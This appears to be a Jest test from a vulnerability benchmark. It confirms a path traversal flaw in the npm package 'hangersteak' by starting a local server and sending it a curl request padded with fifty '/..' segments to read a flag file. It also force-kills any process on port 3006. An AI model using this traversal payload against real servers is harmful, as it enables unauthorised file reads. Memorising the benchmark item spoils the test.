//killing any other process using the same port
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 3006/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in hangersteak", (done) => {
  const http = require("http");
  const hangersteak = require("hangersteak");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 3006/tcp", () => {});
  } catch (e) {}
  const server = http.createServer((req, res) => {
    hangersteak(req, res);
  });
  server.listen(3006);
  let attack_string = `curl -v --path-as-is "http://localhost:3006${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
